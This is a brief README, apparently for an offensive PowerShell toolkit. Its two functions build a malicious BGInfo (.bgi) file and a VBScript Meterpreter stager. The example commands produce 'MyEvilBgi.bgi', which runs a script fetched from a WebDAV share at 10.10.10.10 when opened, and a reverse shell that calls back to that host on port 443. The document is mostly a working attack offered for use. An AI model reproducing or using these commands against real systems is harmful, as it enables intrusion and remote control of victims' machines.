# BGInfo
2 Functions used to create a .BGI file executing script.
Thanks to Cn33liz - @Cneelis for VBSWebMeter.

How to use the functions:

## Example ##
This example will generate a file called MyEvilBgi.bgi and VBSMeterShell.vbs inside the c:\BGIPayload folder. The BGI file will try to execute \\10.10.10.10\webdav\VBSMeterShell.vbs when opened. 

New-BGIFile -FileName "MyEvilBgi.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"

New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"
